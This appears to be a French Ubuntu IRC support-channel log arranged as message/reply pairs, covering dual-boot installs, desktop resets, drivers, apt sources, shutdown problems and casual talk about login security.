ah bein … : http://stackoverflow.com/questions/25249762/process-usershare-file-stat-of-failed-permission-denied-samba Sylario	je vais essayer maus j'y crois moyennement j'accedais a cet ubuntu avec un autre windows
je vais essayer maus j'y crois moyennement j'accedais a cet ubuntu avec un autre windows	alors
bonjour, y a t il une appli ou un greffon qui affiche si la touche TAB  ou numlock sont activés à  l'écran? merci oups*	ça doit être :)
merci	tu vas avoir un problème quand Abiword se mettra à jour
42 ??	ce que nW44b tente subtilement de te dire, c'est que ta question est inexistante
et si je souhaite que les utilisateur stock leurs donnée non pas sur le serveur mais sur un disque monté sur le dossier /media/xxx, comment faire ?	https://doc.ubuntu-fr.org/mount_fstab
plus clairement, est-il possible dans owncloud/core/skeleton d'inserer un "raccourci" vers un dossier à l'adresse /media/lambda afin que tous les utilisateur puisse interagir avec	crée un groupe, ajoute tous les users dans ce groupe, partage le dossier avec ce groupe
je ne maitrise pas le sujet, j'ai donc arrete de l'aider pour son installation dual boot	euh, je capte pas un truc … j'ai backlogué en diagonal, y a un fakeraid sur un portable avec un seul disque ?
yep, je ne sais meme pas si wubi est encore supporté	il a un problème avec un hdd RAID ou plutot un fakeraid
Bonjour à tous. Je voulais savoir si quelqu'un parmi vous aurai eu a installer un amorceur multi-boot et je voulais savoir comment il a fait. Merci :)	ca ne sert à rien de repetter le même message, si quelqu'un peut/veut repondre, il le fera … si tu veux relancer la discussion sur ton probleme, il est beaucoup plus efficace de donner plus de details
https://www.reddit.com/r/linux/comments/3juc7d/bootrepair_shares_some_information_about_your/	parce que si il faut citer sur le salon de support tous les programmes externes qui ont un ppa et des soucis de securité, on est pas rendu :p
ils sont moins à jour mais ok je teste	 moi je pars du principe que pour la CG faut pas être trop aventurier, ça déconne souvent
aucune idée désolé	 pas suivi désolé, et si c'est trop technique je suis incapable d'aider, je suis un utilisateur non informaticien
;erci	ouvre un terminal, tape: setxkbmap fr
ouvre un terminal, tape: setxkbmap fr	Ok c'est passé en azerty pour cette session
c'est retombé en marche quoi :D	je suis fier de toi :)
ensuite j'ai fait un apt-get install --reinstall sur tous les paquets modifiés	cool
http://www.materiel.net/ordinateur-portable/msi-gx660r-e6605r-269fr-61899.html	tu peux peut etre changer ton disque dur ou alors essayer de créer les partitions d'ubuntu puis rebooter et reinstaller windows, puis rebooter et installer ubuntu
euhhh... Aucune idée ^^'	je m'arrete là avec toi, je ne maitrise pas la suite et ce disque de 1To que tu as et qui donne l'apparence d'un disque RAID suscite beaucoup de manip pour installer ubuntu dessus
@ mezen et beaver` : j'ai réglé mon problème à priori !!	super comment t'as fait ?
oui	c'est juste une fenetre de confirmation
et plein d'autre chose apres	ext4
oki, utiliser comme ?	utiliser comme /
ah ok	début
qui different	oui, clique sur l'espace disque, puis bouton ajouter
re	re
je suis sur la fenetre créer une partition	celle la ?
la clé est prete	bah si ton pc est récent, t'as un truc dans le bios (Secure Boot, ou EFI, ou UEFI)
en cours	t'as l'EFI dans ton pc ?
http://puu.sh/k0E4F/9d9228bf0a.jpg	Ok
Je télécharge à nouveau lors ? :o	essaye avec pendrivelinux http://www.ubuntu.com/download/desktop/create-a-usb-stick-on-windows
par clé usb ou par cd alors ?	oui, cle usb live bootable ou CD live
quand je lance l'iso depuis DAEMON tool, il me sort un wubi oui	ah non c'est pas la bonne façon de procéder
non car le pc avec lequel je te parle est celui concernée . Je suis sur windows actuellement	mais comment tu peux installer ubuntu depuis windows ? je comprends pas
il me disait de créer des chose pour le "swap". Inutile ou necessaire ?	c'est pas nécessaire mais ça peut servir pour hiberner il me semble
en "non alloué"	cool. donc à l'etape du partionnement, tu selectionnes partitionnement manuel
cool. donc à l'etape du partionnement, tu selectionnes partitionnement manuel	le autre chose je suppose ?
le autre chose je suppose ?	puis tu crées une deuxième à 75 Go pour /home
J'ai laissé 100 Go de libre :)	puis tu cliques sur les 100 Go, tu crées une partition / disons à 25 Go (pour le système)
Et ubuntu ne reconnait pas windows :/	en dual boot, il faut préparer les partition d'abords, si t'en as qu'une seule, il va falloir resizer celle de windows pour faire de la place
voilà grilled	si tu pouvais tester le unity-tweak-tool, peux tu stp rajouter la manip dans la documentation ? :) je n'ai pas envie d'installer unity pour confirmer
ça vient de moi :þ	va falloir le rajouter dans la doc alors :)
va falloir le rajouter dans la doc alors :)	tu peux :D
enfin ubuntu-tweak-tool	non unity-tweak-tool pas ubuntu-tweak-tool :)
13:04 < beaver`> unity-tweak-tool --reset-unity	on peut plus faire confiance à la doc ? c'est moche :(
c'est moche ...	tu peux refaire sudo service lightdm restart
unity-tweak-tool --reset-unity	si tu maitrises cet environnement, tu peux continuer avec lui ?
il me demande un default display manager ? gdm ou lightdm ?	lightdm
d'ailleurs faudra que je me mette à APT tout court un jour	c'est pas parce que c'est unity, c'est parce que je suis nul en support unity
par contre je dois pouvoir installer un gnome-shell vite fait par exemple	tu n'as que unity?
error: Cannot autolaunch D-Bus without X11 $DISPLAY	t'as quoi sous la main ?
enfin installé mais non fonctionnel	log toi dessus ou sur n'importe quel environnement et tape dconf reset -f /org/compiz/
pas seulement unity non ? il n'y a pas la conf de toutes les apps installées sur la machine ?	t'as déjà unity ?
mais remove le .config complet c'est moche un peu	non je déconseille de purger unity, trop de dépendances et c'est mal géré
https://bugs.launchpad.net/ubuntu/+source/unity/+bug/1292396/comments/6	?
ok mezen c'est possible :)	ça explique ma question par rapport à la version du pilote
j'ai envie de dire que ton probleme, est peut être/sûrement provoqué par ce PPA	ça a résolu le problème d'un gars avec une carte nvidia puissante, le pilote dans les depots ubuntu merdait beaucoup
https://launchpad.net/~xorg-edgers/+archive/ubuntu/ppa	le pilote est bien pris en compte, je voulais lui indiquer le ppa xorg-edgers à rajouter si'il ne l'avait pas deja
ok, je tente de supprimer le driver nvidia, je remove le ppa et je reboot la machine, je verrais si je recupère unity et ensuite je regarderai comment faire une installe propre du driver nvidia	attend un peu.
aka if you fresh install of 12.04.2 or newer.	à quel niveau? nvidia ?
WARNING: Do not use this PPA with the precise X backport stacks (*)	merci pour le ppa, je l'avais oublié celui la
boot-repair rien à signaler paquet classique, et le premier c'est pour choper le driver nvidia	ça ressembe à ce bug; https://bugs.launchpad.net/ubuntu/+source/unity/+bug/1292396
le probleme c'est pas son driver nvidia mezen visiblement	je procède par élimination moi, peut etre t'as raison
j'ai vérifié il semble complet (comparaison entre le pastebin et les logs machine)	t'as quoi toi en fait ? quelle version ?
http://paste.ubuntu.com/12281069/	et c'est quoi au final, tu arrives à te logguer ou pas ?, initialement tu disais "session ko"
12:18 < beaver`> 12:16 < beaver`> sudo cat /var/log/lightdm/lightdm.log | pastebinit	si
bon .... .compiz et .config/compiz-1 renommés. je reboot la machine ?	ou redémarre la session graphique
tu sais quel probleme il a ?	il ignore les gens ?
plus de fond d'écran ni rien	c'est peut etre compiz en fait
j'arrive à me connecter à ma session, mais à part un clique droit et mon conky, l'environnement graphique est vide	on peut voir les logs systemes ?
ok je récapitule ^^ (merci pour votre coup de main)	il faut des logs
pour info, Ubuntu 14.04.3 LTS avec driver nvidia actif pour une GeForce GTX 770	j'arrive tard moi, j'ai pas saisi ton problème
merci mvvvv , j'ai déja lu ça en fait, et ça me dit pas vraiment comment m'en servir..	tu a essayé la commande : charmap ?
et t'il quand même possible de relier notre terminal au contenaire pour faire les install ? ou il faut créer un contenaire deja programé	sinon il existe un chan dédié à docker sur freenode #docker
et sans indiscrétion quel application web réclame un apache 2.4.8 ??	https://httpd.apache.org/docs/2.4/fr/mod/mod_ssl.html#SSLOpenSSLConfCmd
voir 1 an pour la prochaine LTS	en restant sur 14.04, je me condamne à pas avoir la nouvelle version et j'en ai besoin
egalement :)	j'ai installé le package de 15.10 manuellement (dans une autre répertoire et seulement pour apache2) en attendant que ça soit en release
mais je vais essayer un autre truc encore car rien dans apache2 conf	tu peux aussi grep -R tout comme moi ♫♬♩♫♪
snakeoil.pem..	il prend le bon vhost, déjà ?
'fin la doc', l'article quoi	perso, je préfère ajouter des fichiers de conf que modifier ceux par défaut
ben  de rien :\	un ancien sujet, j'ai remarqué que tu utilises aptitude
C'est forcément que j'ai une couille...	installe identique ?
https://launchpad.net/ubuntu/utopic/+package/libglib2.0-dev	oui
fais un report de bug chez eux	c'est quand meme bizarre
Et pourtant j'ai rien fait de spécial.	t'as quelque chose à dire pour ta défense ?
:3	regarde mon paste
:p	joli :)
@info glib2.0 trusty	:)
lolwat	et tu n'as aucun fichier dans /etc/apt/sources.list.d/ ?
et tu n'as aucun fichier dans /etc/apt/sources.list.d/ ?	oh si, plein :3
>_<	c'est dans le menu télécharger depuis
c'est dans backport le 2.42 en plus	je le trouve pas dans trusty backports
https://gist.github.com/Nek-/61a4c84f1d8bb97ebddd#file-sources-list	tu peux commenter la dernière ligne et faire un sudo apt-get update puis sudo apt-get upgrade ?
deb http://www.rabbitmq.com/debian/ testing main <-- et ça ?!	bah ça c'est rabbitmq y'a pas d'mal normalement.
*next*	en fait c'est une version cassée apparemment.
!ops	c'est ton bot ?
c'est ton bot ?	c'est le bot de la communauté
hello	Bonjour mon brave !
j'ai involontairement donné un coup de coude sur mon clavier braille	essaye de recompiler
vaudrait mieux que je prennes les sources du dépôt, ou que je prennes le python sur le site officiel ?	sudo apt-get source python2.7:i386
bah... il semble que si, puisque je tourne avec la 14.04...sauf que même avec ça, j'ai toujours le souci	télécharge les sources et compile avec par exemple --prefix=$HOME/python32
Merci vamps. ça sort peut-être un peu du cadre mais ça se pousse un peu la fréquence du bus ou pas la dessus ?	bah, tu m'as toujours donné aucune indication précise sur ton processeur, donc difficile de répondre :p
http://pix.toile-libre.org/?img=1441124047.png	regarde la colonne CPU
Je suis en 64 déjà	donc c'est bon, c'est ou que tu as vu cette histoire de powerpc ?
Bonjour. J'ai acheté une machine i7 . Je lui ai mis mon disque dur avec Xubuntu, ça marche, pas mal même, mais je viens de voir qu'elle aprocesseur power pc. J'aurais bien à gagner à réinstaller une version ppc ?	heuu ? si tu as un i7 c'est pas un power pc
Ekiga aussi peut-être	oui un bon logiciel SIP avec un bon prestataire
puis de toute façon on va tous passer à snappy :D	c'est Stretch, pas Snappy, la prochaine Debian
j'evite de faire des commande que je connais pas	chacun son truc, synaptic n'est pas installé sur mes machines, et je me sers souvent de show, policy, depends, etc.
et son intérêt, c'est pas juste d'ajouter de la couleur...	je me sert extrement rarement de show, si je veux des details sur un paquet j'ouvre synatic
ya pas une presentation de ce que permet salt quelques part, le site officiel est pas clair, et j'ai pas envi de me farcir toute la doc avant de me rendre compte que c'est pas ce dont j'ai besoin	je ne te proposais pas d'installer Salt, mais de regarder ce qu'il lance comme commande ^^
eolien en résumé apt c'est apt-get avec de la couleur	pas exactement, puisque la commande show vient d'apt-cache, pas d'apt-get, par exemple
sur un poste ou j'ai deja fait l'install en repondant manuellement, je grep le nom du paquet sur "debconf-get-selections", ca me sort rien	regarde ce que lance salt avec son module pkg.upgrade
je regarde, thx	genre http://www.microhowto.info/howto/perform_an_unattended_installation_of_a_debian_package.html#idp36320
https://help.ubuntu.com/community/AutomaticSecurityUpdates	tu demandes à faire quoi ?
sinon piti, quelques chose de plus interressant à dire ?	c'est pour maj un certain nombre de machines ?
ça te parle [FR]Dae ?	connecte toi en non-graphique (tty, ctrl+alt+f1)
repond à ma question SVP	pour ce qui est de la version, je ne sais plus trop
?	Bonne nuit :)
bha oui : ouvrir avec firefox	j'ai compris mais je n'y aurais pas pensé!
j'ai compris mais je n'y aurais pas pensé!	ouaip mais non car quicktime n'est pas dispo pour firefox linux ... ils disent d'utiliser MPlayer
ouaip mais non car quicktime n'est pas dispo pour firefox linux ... ils disent d'utiliser MPlayer	Apple, que des problémes!
rhoo	c'est facile de taper sur VS "like shooting a fish in a barrel"
en dehors de confirmer que quicktime c'est vraiment un format moisi, je ne vois rien de surprenant	piti > http://www.commitstrip.com/fr/2014/03/13/the-unexpected-default-program/ <-- là j'ai ça m'a fait rire .... tellement vrai ᴖ_ᴖ (windows old)
Dois je utilise un autre lecteur ou es sans espoir? Une conversion de fichier?	tu as essayé sur les browsers ? ils ont un plugin quicktime
tu as essayé sur les browsers ? ils ont un plugin quicktime	lire un fichier vidéo avec un navigateur?
personne n'a de solution?	en quoi t'aiderait-il sur Ubuntu ?
(sinon, si c'était le même que le mot de passe de session, il était passé à seahorse en même temps que l'ouverture (par un hack sans doute horrible)	pas de hack horrible … enfin du pam
par contre, au moins historiquement, suivant comment on choississait d'enregistrer ses mots pass et si on s'auto-loguait, les mot de passe wifi était enregistré en clair	Ça c'est si explicitement on indiquait un mot de passe de trousseau nul
Ok merci beaucoup :)	non mais c'est pas ça
 /media	Oo !
petite question : j'aurais voulu savoir dans quel dossier sont stockés les clés wifi sous ubuntu ?	à mon avis, c'est pas stocké lisible comme ça. Tu dois pouvoir les lire depuis network-manager, et c'est probable qu'elles soient chiffrées avec ton mot de passe de session (ou le mot de passe de ton trousseau de clés)
en même temps, commitstrip, c'est pas connu pour sa pertinence technique (ni pour etre drôle)	en effet, je viens d'en lire une 15aine, ça m'a même pas arraché un sourire (et technique ras les pâquerettes)
en effet, je viens d'en lire une 15aine, ça m'a même pas arraché un sourire (et technique ras les pâquerettes)	yep … après chacun ses (mauvais) goût, mais quelqu'un m'en avait parlé comme un xkcd en francais à l'époque … disons que le déconvenu fut grande, c'est plus un mauvais userfriendly (et je ne suis pas fan d'userfriendly)
http://www.commitstrip.com/fr/page/7/	suffit que les mots de passes en question aient été fuité par des lambdasites (avec pass en clair) et qu'ils aient fini dans des wordlists
sur des mots de pass impossible	mauvaise pratique
mais bon, si tu te blesses la main (ou si tu vieillis), tu t'auto lock-out	y'a des chances que y'ait encore une partie du pattern qui t'identifie
y'a des chances que y'ait encore une partie du pattern qui t'identifie	merci, j'avais zappé le lien, j'avais juste lu une publi sci sur le sujet il y a un baille, je suis curieux de voir ce que ca donne
sur le sujet, le seul truc qui m'avait intrigué, c'est un systeme qui te demande de tapoter une phrase et qui arrive à reconnaitre une personne en fonction de comment elle tapote, et visiblement c'est pas immitable, et la personne n'a pas conscience de ce qui represente le mot de passe, donc ne peut pas le fournir sous la pression	a ouais …
dès que tu peuux fournir la "clé" involontairement c'est useless	c'est le lien que j'ai mis au dessus
je legitime son usage pour certains cas uniquement (juste un a vrai dire) et non c'est pas un moyen valide d'assurer une vrai secu	j'ai dû en avoir une dizaine entre les mains, le seul qui a résister à des tentatives stupides, c'est celui qu'on m'a laissé moins de 5 minutes
j'ai dû en avoir une dizaine entre les mains, le seul qui a résister à des tentatives stupides, c'est celui qu'on m'a laissé moins de 5 minutes	ah quand meme ouais
ahah	en utilisant le bignou, tu légitimes son usage et sa validité. Je viens de balancer le lien vers apple, et citer le paiement nfc pour indiquer combien ce mésusage est présent
en utilisant le bignou, tu légitimes son usage et sa validité. Je viens de balancer le lien vers apple, et citer le paiement nfc pour indiquer combien ce mésusage est présent	on est pas obligé d'etre tout noir ou tout blanc
on est pas obligé d'etre tout noir ou tout blanc	tant qu'à faire, je préfère quelque chose comme ce que fait : http://behaviosec.com/ au moins c'est intrinsèque, et ça semble plutôt efficace
ça sera plus simple pour tout le monde	hihih :)
"tu m'a fait un clin d'oeuil donc tu approuve ce payement"	http://www.apple.com/fr/iphone-6/touch-id/ : "Votre empreinte digitale est le mot de passe absolu. Vous l’avez toujours sur vous. Et personne ne pourra jamais le deviner." Sauf que tu la laisse trainer à pas mal d'endroit, et qu'un petit malin doit pouvoir la falsifier assez simplement
http://www.apple.com/fr/iphone-6/touch-id/ : "Votre empreinte digitale est le mot de passe absolu. Vous l’avez toujours sur vous. Et personne ne pourra jamais le deviner." Sauf que tu la laisse trainer à pas mal d'endroit, et qu'un petit malin doit pouvoir la falsifier assez simplement	non mais comme jte dit je comprends bien tout ça, c'est juste que pour un desk chez toi, jpense que c'est ptetre un truc que tu peux te permetre sans forcement laisser ta session sans mot de passes, c'est tout :)
non mais comme jte dit je comprends bien tout ça, c'est juste que pour un desk chez toi, jpense que c'est ptetre un truc que tu peux te permetre sans forcement laisser ta session sans mot de passes, c'est tout :)	dans ce cas, autant mettre un mot de passe simpliste (et de l'écrire au dessous de l'écran)
https://www.youtube.com/watch?v=3Hji3kp_i9k	ça démontre bien la totale inefficacité du lecteur d'empreinte
ça démontre bien la totale inefficacité du lecteur d'empreinte	plutôt concluant oui
bientot ça ce fera au regard je pense	je pense que c'est une mauvaise idée, y compris chez soi
(attention la référence du lundi matin)	ça depent de la machine sur la quel tu te connecte
sauf quand on est un peut parano sur les bords :)	https://xkcd.com/936/
clé publique/privée ?	comment ça marcherai un sys de clé pour les login ??
comment ça marcherai un sys de clé pour les login ??	clé physique sur clé USB :)
genre c'est usant, au login par moment je me trompe 4 à 5 fois quand je suis un peut speed et que les doigts vont plus vite que le cerveau, et la même pour la commande sudo...	apprends à taper au clavier :p
re	j'avais un lecteur d'emprinte a un moment, ça marchait assez bien
!wiki transmission	http://doc.ubuntu-fr.org/transmission | http://doc.ubuntu-fr.org/seedbox | http://doc.ubuntu-fr.org/clutch | http://doc.ubuntu-fr.org/domotique | http://doc.ubuntu-fr.org/torrentflux
je connais bien transmission-daemon, mais Qbitorrent hm	pm
Ok. Merci	je te recommande ipcalc si tu ne connaissais pas
Merci SurcouF pour l'explication, la démo était véritablement nécessaire.	mon client actuel a pas mal de sous-réseaux comme cela
Je vois.	ton DHCP est là pour mettre à jour la configuration IP des clients de manière silencieuse
Le Hs, c'est pas sur off-topic ? :)	pour toi, qu'est qu'un masque de réseau ?
yop McPeter	o/
tu sais depuis combien d'années sur suis en linux only	à moins de 15 ans, chut ;-)
connais pas Windows	t'as vite oublié windows ? :p
et je ne vois pas le rapport entre sniffer to reseau et configurer tes boitiers CPL	le lien c'est que l'outil utilise winpcap. Visiblement c'est propriétaire oui mais je cherche s'il n'y a pas de hack. Et je vais regarder ça d'abord : http://www.nosuchcon.org/talks/2014/D1_03_Sebastien_Dudek_HomePlugAV_PLC.pdf
j'ai vu un truc qui s'appelait wireshark ... je sais pas trop si ça pourrait le faire	decris plutôt ce que tu cherches à faire
Oui. Mon bios peut bien démarrer sur l'USB (clé USB bootable)	et que dit ton pc quand il démarre sur l'usb ? as tu un message qui dit que ce n'est pas bootable avant d'aller sur le disque dur ou il y a windows?
(je ne peux pas booter dessus)	en usb ? il te faut démarrer sur l'usb alors (paramètre bios) et il te faut un grub installé sur l'usb
Comment puis-je obtenir de l'aide en direct?	pose tes questions et patiente, si quelqu'un sait on te répondra
bien qu'informaticien je regrette tout le temps perdu à administrer	et tant mieux si ca te convient que quelqu'un le fasse à ta place, je dis juste que ca ne m'interesse pas moi …
mais le conteneur c'est pas canonical qui le fait (dans le cas de snappy) ? et donc comme ils veulent vendre ça partout, ils devraient être réactif sur les patchs...	l'appli reste trouée … ca veut dire que tu dois vivre sans tant que ce n'est pas patché, et comme l'appli est contenerisée, ses composants ne sont pas isolables en cas de souci, au niveau pro, un service down pendant 10 minutes, c'est pas acceptable
c'est juste l'appli en question qui est trouée, elle est supposée être isolée non ?	si c'est canonical
si cest "contenerisé" en quoi ça gene les trous de sécurités ?	justement, c'est le conteneur qui peut avoir les trous
https://developer.ubuntu.com/en/snappy/	si tu me lances sur ce sujet, va falloir decaller sur -ot, car je veux pas nettoyer le traces de sang sur le salon de support
et je ne pense pas qu'il y ait la masse critique de packagers snappy pour que ca soit utilisable sur autre chose que l'ubuntu phone (c'est la plateforme visée en priorité, hein)	et les clouds non ?
ca arrive à chaque version	avec fedora c'est pas pareil, si c'etait basé sur apt, je changerai complètement de distro
avec fedora c'est pas pareil, si c'etait basé sur apt, je changerai complètement de distro	install sid
ils continuent à développer unity qui à mon sens ne sera pas le DE du siècle	les "designers" de gnome ont toujours voulu pousser la simplification à l'extreme
(pour gnome une feature, c'est souvent virer des options de config)	ils n'ont pas les moyens en terme de ressources humaines pour continuer à mettre à jour et tester ?
ils n'ont pas les moyens en terme de ressources humaines pour continuer à mettre à jour et tester ?	c'est pas ca le probleme
http://freecode.com/projects/darkstat/	c'est pas la premiere fois que la team unity est dans desaccord avec les nouvelles "feature" de gnome, et decide de prendre une version de retard pour trouver une solution
ils l'ont corrigé je pense	oui mais unity a besoin de temps pour tester ses releases ... d'où le retard
je me demande pourquoi ubuntu 15.04 ne fait pas gnome 3.16 en mise à jour, pourtant il est sorti avant la release mais après le freeze	parce que unity utilise gnome ... et est dépendant de la dernière version stable de gnome
both channel will expect french discussion though	désolé, j'ai dit l'inverse
merci	this is a technical support channel  in french, it is asked to not go offtopic here, for offtopic: #ubuntu-fr-offtopic for discussing ubuntu french events: #ubuntu-fr-party
d'accord	#ubuntu channel will provide english langage support
I don't know what's involved. I heard from news that some European governments played against the monopoly of Microsoft. I don't know whether it's related.	you could join #ubuntu-fr-offtopic to speak english there, there is no language or topic restriction
WINDOZE 2000	answer please :)
yes	j'aime bien le globe dans cette page
fsf is also for "free".	a french humorist said that he went to opera where he listens to a speeech of more than 4 hours and in a foreign language. the reason is to appreciate the cigarette after he leaves
merci mezen :), namoamitabuddha c'est pas grave, tu essayes au moins ;)	What's that webpage? some subbranch of FSFE or so?
http://www.agendadulibre.org/ namoamitabuddha	peut etre ntopng
tss	c'est vrai en plus :)
y'a une interface web ?	en fait c'est un scanner de ports
Then where to watch the celebration?	http://ubuntu-paris.org/
28 / 29	c'est quand la prochaine ubuntu party ?
for Ubuntu, etc	no it's too early. Next release will be end of October
Hello, any action in Paris?	unfortunately no
ça commence par un x et ça se termine par t	 surement parce qu'il n'est pas la :)
 surement parce qu'il n'est pas la :)	mais alors c'est qui qui nous écrit ?
logiquement	pourquoi tu parais tout gris dans ma liste à droite
quit	je pense avoir une experience interessente à te faire
même si tu veux faire un rapport de bogue il te faudra du verbeux	 son probleme est que l'ordi reboot au lieu de s'eteindre
quit	 regarde du coté de l'acpi ussi
pourquoi ntfs ?	je ne sais pas ext 4 c'est OK?
je ne sais pas ext 4 c'est OK?	pour linux c'est mieux oui. ntfs ce serait si tu avais un dual boot windows.
pour linux c'est mieux oui. ntfs ce serait si tu avais un dual boot windows.	Merci de l'aide
J'ai un probleme d'arrêt sur ubuntu 14.04, et j'aimerais savoir comment est crée le fichier : /var/run/utmp; D'avance merci pour toute réponse.	toujours pas réglé ? rien au niveau bios ?
toujours pas réglé ? rien au niveau bios ?	pour le bios l'est mis à jour, j'ai intedit le reveil par le réseau. Mais ce n'est à priori pas ça. Je cherche dans les ordres d'arrêt de Ubuntu, sachant qu'avec un Live USB Fedora ça fonctionne.
pour le bios l'est mis à jour, j'ai intedit le reveil par le réseau. Mais ce n'est à priori pas ça. Je cherche dans les ordres d'arrêt de Ubuntu, sachant qu'avec un Live USB Fedora ça fonctionne.	c'est pas les solutions qui manquent : BIOS (Config->USB->Always On USB)
c'est pas les solutions qui manquent : BIOS (Config->USB->Always On USB)	J'ai misà jour le bios de la carte Gigabyte GA-A75M-S2V en version la plus haute F5, mais le problème reste le même lorsque je demande un arrêt Ubuntu reboot. Aprés analyse il semble que shutdown ou poweroff vient lire le fichier /var/run/utmp. Donc je me demande comment ce fichier ecrit ?
le probleme est le même sous Ubuntu 14.04	quand tu tapes x-www-browser
La « meilleure » version actuelle est « /usr/bin/google-chrome-stable ».	xfce settings > preferred applications
à la place de gnome	des fois je suis un enfoiré
oui j'ai essayer ca marche pas	voilà, mais tu fais ça via ctrl + alt + F4
mais quand j'ai fait unity --reset-icons tout l'interface a disparu	bah restart la session
sur gnome normalement	tape Ctrl+Alt+T
bah mon gnome a disparu aussi	??
Malheureusement malgré "quiet splash acpi=noirq", le probleme reste le même. Je suis kernel Linux 3.13.0-62	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
Oui je suis cours.	on peut voir le /var/log/boot.log ?
UBUNTU 14.04	y'a du monde
Bonsoir. J'ai toujours un problème lors de l'arrêt de UBUNTU, l'ordinateur reboot systématiquement. Action dejà engagée mise à jour du BIOS, interdiction reveille ordinateur par le reseau. Lorsque je fait: sudo shutdown -P 0 ubuntu s'arrête mais pas l'ordinateur. Si je demarre l'ordinateur avec une Live-Usb Fedora à la  demande arrêt l'ordinateur s'arrête. Qu'un aurait-il une solution ?	http://askubuntu.com/questions/125844/shutdown-does-not-power-off-computer
je dois copier mon home sur une partition puis je install comme d'hab et après je remplace? c ca??	tu peux faire ça, ou alors installe par dessus
qqn sait comment installer une nouvelle distro sans supprimer le dossier home ? j'ai 14.10 installé et je veut mettre 10.04 lts a la place	10.04 n'est plus supporté depuis avril, https://doc.ubuntu-fr.org/lts
10.04 n'est plus supporté depuis avril, https://doc.ubuntu-fr.org/lts	merci pour la reponse c'est une fausse de frappe je veux dire 14.04
merci pour la reponse c'est une fausse de frappe je veux dire 14.04	ha oui j'ai oublié, est ce que ton / et ton /home sont sur la meme partition ?
ha oui j'ai oublié, est ce que ton / et ton /home sont sur la meme partition ?	oui
Bonjour	ok, il te faut une autre partition système "/", installe comme d'habitude avec le partionnement manuel en formatant la partition système et en pointant ton ancien /home sur le nouveau /home
et sinon ? comme il est usb ... juste : eject /dev/sdX	ton lien dit que c'est pas possible :p
je trouve rien pour le moment j'ai pas le disque avec moi je reviens	tu as aussi le paquet "sg3-utils" pour faire ensuite "sudo sg_start --stop /dev/sdX"
echo 1 > /sys/block/(whatever)/device/delete	vamps, j'étais en train de copier des film à ce moment là et j'avais surement oublier de fermer l'explorateur je pense, je vois que ça
nope rien	tu as vérifié les logs avant et apres l'umount ?
quand je démonte mon dd externe, la rotation ne s'arrête pas et je dois le débracher brutalement comment faire? je suis sousxubuntu dernière lts	tu attends que le disque soit bien "umount" ?
!wiki snmp	oui
tu parles de la bibliothèque logicielle ?	http://doc.ubuntu-fr.org/snmp | http://doc.ubuntu-fr.org/mrtg | http://doc.ubuntu-fr.org/shinken | http://doc.ubuntu-fr.org/supervision | http://doc.ubuntu-fr.org/cacti
matin	salut
soit que la partition est monté avec l'option noexec	Merci, merci. C'est bon
c'est soit que le fichier ne t appartient pas, soit que le système de fichier ne gere pas les permissions (fat ou ntfs)	merci j'essaye de mettre le fichier sur une autre partition
J'ai fait shutdown -P 0 et ubuntu reboot .	ça vaut le coup de vérifier le bios ... notamment s'il n'y a pas une mise à jour du firmware.
Bonjour, Lorsque je demande l'arrêt de UBUNTU 14.04, le système reboot systématiquement. Il doit y avoir un ordre reboot dans la configuration d'arrêt, quel est le fichier de configuration à modifier ?	qu'as tu avec la commande : sudo shutdown 0
original :\	pas besoin de mysecureshell, tu peux limiter des users à du sftp directement avec les bonnes options dans sshd_config
pas besoin de mysecureshell, tu peux limiter des users à du sftp directement avec les bonnes options dans sshd_config	oui je sais
et ce n'est pas une passoire ;)	bin si t'as pas fait tes MAJ de sécu depuis qqs mois C'EST une passoire
ahah nW44b	:p
il n'empèche que le canal ubuntu est plus fréquenté que d'autres, il doit bien y avir une raison?	bin c'est la distrib grand public la plus courante
osef du monde francoise, je t'invite à choisir une distribution à la hauteur de tes exigences :)	+1
c'était en 2010;)	j'ose même pas imaginer la passoire qu'est ton ordi
ben il serait temps d'y voir clair	https://www.debian-fr.org/probleme-de-clavier-qwerty-a-la-place-d-azerty-t29135.html 2010
et puis y en a marre de devoir changer de versions tous les 6 mois!	c'est pour suivre les demandes des utilisateurs, enfin principalement
 alors je me souviens plus comment le changr sur un portable HP	http://bepo.fr/wiki/Utilisation_avec_KDE
le / me donne un point aussi	quand tu tape q ça donne quoi ?
oui	si tu veux l'aide, il faudra être un plus verbeux :), ça va être complexe sinon
ensemble	ça fonctionne sur un poste Windows ?
pour rendre la chose newbie friendly :)	je pense que je vais continuer a utiliser multisystem :) ça semble assez galère à faire sans
http://doc.ubuntu-fr.org/tutoriel/grub2_lancer_des_images_iso#grub_2_sur_une_clef_usb	je vais regarder
frafa(*) roh	merci pour le lien
merci pour le lien	tu as encore plus light sinon
tu as encore plus light sinon	dis voir
pourquoi tu recuperes pas le .deb ? avec dpkg tu as ignore-depends	ça me va comme solution
via --no-install-recommends tu installeras pas les dependances recommandées par apt-get	visiblement ça installe quand même les dépendances que je ne veux pas
je crois que c'est pour dpkg mais je ne sais pas l'utiliser	update-manager te rappellera tous les jours que tu as des paquets cassé
update-manager te rappellera tous les jours que tu as des paquets cassé	je fermerais les yeux :)
y'a surement plus propre	--ignore-depends avec apt-get?
geany*	c'est juste un wildcard pour matcher tous les chemins qui contiennent geany
et cache on s'en fout c'est des png icones	find ~ -iwholename "*geany*" ! -uid $(id -u)
yes beaver	tu peux check les droits de .config/geany et des fichiers à l'intérieur ?
piti pour modifier vhost je l'ai utilisé en mode sudo	?
donc la pour comprendre, je cherche l'executable de geany pour voir ses droits c'est ca ?	non tu cherches dans ton home les préfèrences de geany
l'idée apres c'est de modifier le geany.conf ?	sudo find /home -name *geany*
ca me sort idem que find sur geany tout court	find /home -name *geany*
les détails ici: http://www.cowcotland.com/config31307.html	ton live usb est formaté sous quel fs ?
PS: j'ai éssayé avec plusieurs souris, c'est pareil	si tu peux ouvrir un terminal ... vois tu la souris dans la liste de la commande lsusb
free aussi !	sur mon alice box l'interface ne ressemble pas du tout à ça
:)	depuis 15 ans t'es sur ?
sur v4/v5 la conf est stocké chez eux et d/l  a chaque boot	ahhhh !!
je connaissais pas, j'étais resté aux vielles interfaces freebox v5 / alicebox	 http://supertos.free.fr/supertos.php?page=1013 http://supertos.free.fr/html/annexes/ports.jpg
tu devrais enregistrer ton pseudo et surtout quitter proprement irc	le bail dhcp je sais pas, mais l'association adresse mac / ip est purement impossible sur une v5
le bail dhcp je sais pas, mais l'association adresse mac / ip est purement impossible sur une v5	ben sache que ça l'est sur la v6
c est la différence entre v4/v5 et v6	je vois ça
dans reseau local j'ai trouvé Réseau local / DHCP ca devrait etre la	pv
bref	non
